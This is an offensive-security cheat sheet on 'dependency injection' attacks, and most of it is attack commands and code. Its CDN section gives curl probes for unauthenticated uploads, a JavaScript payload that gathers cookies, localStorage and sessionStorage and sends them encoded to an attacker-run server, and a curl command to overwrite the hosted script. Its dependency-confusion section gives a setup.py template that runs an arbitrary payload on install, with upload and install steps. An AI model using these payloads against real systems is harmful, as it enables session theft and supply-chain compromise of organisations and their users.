# Dependency Injection

## Unprotected CDNs

If the web application uses a third party server to retrieve resources such as scripts it is possible to attack the CDN and inject malicious code that is then executed in the page.&#x20;

Identify the CDN server by reviewing the requests sent by the page. This can be done easily in the Network tab of the browser's development tool.

### Verify server vulnerability

Use the following requests to verify if the CDN supports unauthenticated writing via PUT or POST methods

#### Options request

```
curl -i -X OPTIONS <url>
curl -i --request-target "*" -X OPTIONS <base url>
```

#### test unrestricted file upload

```
#PUT
curl -X PUT <url>/test.js -d "test"

#POST
curl -X POST <url> -d @<path to file>
curl -X POST <url> -F @<path to file>               #as form encoded
curl -X POST <url> --data-binary @<path to file>    #use this if file is corrupted
```

### Code injection

Start local server

```
python -m http.server <PORT>
python -m SimpleHttpServer
```

Useful functions to extract data

```
document.cookie;
document.getElementById('<field>').value;
JSON.stringify(localStorage);
JSON.stringify(sessionStorage);
```

Payload to send data to our server

```
var req = new XMLHttpRequest();
var data = <code here>;
var data_encoded = btoa(unescape(encodeURIComponent(data)));
req.open('GET','<URL>:<PORT>/data:'+data_encoded,true); 
red.send();       
```

PUT request to replace resource with one containing our payload

```
curl -T <local file> http://<url>/<remote file>
```

## Dependency confusion

This vulnerability arises when an application uses an internal package that is managed by a private repository. If we can upload our own package to the repository, during build time the python package manager will find duplicate packages and will pick the one with the latest version (this is why we upload a package with v9000 as version). This allows us to inject malicious code in the installer that will be executed by the package manager after retrieving our malicious package.

### Package structure

```
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

PACKAGE_NAME = '<PACKAGE>'
VERSION = 'v9000.9.9'
URL = 'http://github.com/{}'.format(PACKAGE_NAME)

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         os.system('<PAYLOAD>')

setup(
        name=PACKAGE_NAME,
        url=URL,
        download_url='{}/archive/{}.tar.gz'.format(URL,VERSION),
        author='John Doe',
        author_email='real@email.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description='test package',
        cmdclass={
            'install': PostInstallCommand
        },
)
```

### Compile and upload the package

Generate package and upload

```
python3 setup.py sdist
twine upload dist/<package>-9000.9.9.tar.gz --repository-url <repository url>
```

Download package for testing or to transfer the payload on another compromised machine

```
pip3 install <package> --trusted-host <repository domain> --index-url <repository url> --verbose
```
